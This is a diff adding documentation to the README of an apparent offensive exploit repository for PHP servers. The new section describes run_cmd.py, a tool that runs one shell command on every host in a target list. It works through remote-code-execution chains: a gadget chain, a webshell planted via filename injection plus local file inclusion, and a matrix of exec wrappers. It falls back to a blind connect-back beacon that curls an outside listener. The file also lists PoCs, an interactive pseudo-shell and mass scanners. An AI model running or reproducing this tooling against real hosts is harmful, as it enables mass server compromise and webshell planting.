@@ -301,6 +301,31 @@ Networking notes:
 For authorized testing only — scanning makes the target execute connect-back
 commands.
 
+## Command runner (`run_cmd.py`)
+
+Runs one command on every host in `urls.txt`, sequentially, trying each
+technique until one works. Simplest tool in the repo: one flag for the
+command, output-first, the connect-back beacon only as a fallback.
+
+```bash
+uv run run_cmd.py --cmd 'id' --docker p2s2-lab
+uv run run_cmd.py --cmd 'id; uname -sr' --beacon 'curl <IP_ADDRESS>:8000'
+uv run run_cmd.py --cmd 'id' --hosts targets.txt --a-lfi-path /vuln.php
+```
+
+Order per host:
+1. chain C gadget, output via the `==PROOF==` echo / `--docker` proof file
+2. chain C gadget with the beacon as the command (blind)
+3. chain A webshell (filename injection) + LFI, marker then command output
+4. chain A webshell with the beacon as the command (blind)
+5. chain A one-shot matrix (6 wrappers x 2 vectors), marker then output
+
+Endpoints are auto-probed unless given. `--docker` additionally reads the
+proof file. Exit code `0` only if the command ran on every host. Commands
+must be single-line; commands with double quotes automatically use the
+progress-value webshell (no filename truncation) instead of the filename
+vector.
+
 ## Findings from this verification (beyond the original research)
 
 1. **Filename truncation.** PHP's multipart parser stops a `filename="..."`
@@ -334,6 +359,8 @@ poc_chain_a.py            Chain A PoC  (uv run, stdlib only, http/https)
 poc_chain_c.py            Chain C PoC  (uv run, stdlib only, http/https)
 rce_shell.py              Interactive pseudo-shell over chain A or C (REPL)
 scan_hosts.py             Multi-host scanner for chains A and C (threaded)
+run_cmd.py                Run one command on every host in urls.txt, trying
+                          all techniques (output first, then blind beacon)
 scan_blind.py             Blind-capable scanner: beacon listener on :8000,
                           all techniques (6 exec wrappers x 2 vectors)
 hosts.example.txt         Example target list for the scanners
